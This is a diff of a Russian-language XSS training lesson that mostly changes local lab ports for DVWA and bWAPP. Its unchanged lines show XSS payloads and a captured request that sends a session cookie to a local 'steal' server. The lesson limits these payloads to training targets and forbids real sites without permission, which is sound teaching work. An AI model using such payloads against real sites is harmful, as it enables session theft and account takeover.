@@ -23,7 +23,7 @@
 **Что нельзя переносить на Slider AI без отдельного разрешения:** учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence.
 
 
-**Процессный артефакт:** `THREAT_MODEL.md` или `SECURITY_FINDING_TEMPLATE.md`: abuse case, evidence и expected control.
+**Процессный артефакт:** встроенный шаблон threat model или finding из пользовательской инструкции: abuse case, evidence и expected control.
 
 **Безопасная цель:** DVWA, WebGoat, bWAPP, PortSwigger Web Security Academy или локальная учебная VM. Запрещены реальные сайты без письменного разрешения.
 
@@ -179,7 +179,7 @@ Kali ARM64 VM используется как углубление, когда �
 
 ### Настройка DVWA
 
-1. Откройте http://127.0.0.1:8080 (IP вашей VM с DVWA)
+1. Откройте http://127.0.0.1:8081 (DVWA)
 2. Установите уровень безопасности **Low** (DVWA Security)
 3. Перейдите в **XSS (Reflected)**
 
@@ -275,7 +275,7 @@ Message: <iframe src="javascript:alert('XSS')" style="display:none"></iframe>
 GET /steal?c=PHPSESSID%3Dabc123def456%3B%20security%3Dlow HTTP/1.1
 Host: 127.0.0.1:4444
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
-Referer: http://127.0.0.1:8080/vulnerabilities/xss_s/
+Referer: http://127.0.0.1:8081/vulnerabilities/xss_s/
 ```
 
 **Ответ сервера при XSS в bWAPP:**
@@ -362,7 +362,7 @@ python3 steal_server.py
    
    Какой пейлоад сработал? Почему?
 
-4. **XSS в bWAPP**: Откройте bWAPP (http://127.0.0.1:8080), выберите уязвимость **XSS - Reflected (GET)**, уровень low. Выполните XSS с пейлоадом `<script>alert('bWAPP XSS')</script>`. Сделайте скриншот результата.
+4. **XSS в bWAPP**: Откройте bWAPP (http://127.0.0.1:8082), выберите уязвимость **XSS - Reflected (GET)**, уровень low. Выполните XSS с пейлоадом `<script>alert('bWAPP XSS')</script>`. Сделайте скриншот результата.
 
 5. **Cookie с флагом HttpOnly**: В DVWA (уровень Low) проверьте, есть ли у cookie флаг HttpOnly. Откройте DevTools → Application → Cookies. Если cookie доступна через `document.cookie`, значит HttpOnly отключен. Опишите, как это влияет на XSS-атаку.
 
